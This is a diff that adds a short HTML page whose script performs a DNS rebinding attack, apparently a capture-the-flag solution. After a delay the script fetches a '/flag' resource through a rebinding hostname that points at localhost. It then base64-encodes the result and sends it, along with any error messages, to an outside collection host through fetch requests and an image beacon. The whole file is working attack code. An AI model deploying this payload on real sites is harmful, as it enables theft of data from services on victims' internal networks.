@@ -1,0 +1,16 @@
+<html>
+<script>
+setTimeout(() => {
+    fetch('http://7f000001.acd918ee.rbndr.us/flag')
+        .then(r => r.text())
+        .then(flag => {
+            fetch('https://pfg2wxc2.c5.rs/?flag=' + btoa(flag));
+            new Image().src = 'https://pfg2wxc2.c5.rs/?img=' + btoa(flag);
+        })
+        .catch(err => {
+            fetch('https://pfg2wxc2.c5.rs/?error=' + err.message);
+        });
+}, 2000);
+</script>
+<h1>DNS Rebinding Attack Loading...</h1>
+</html>
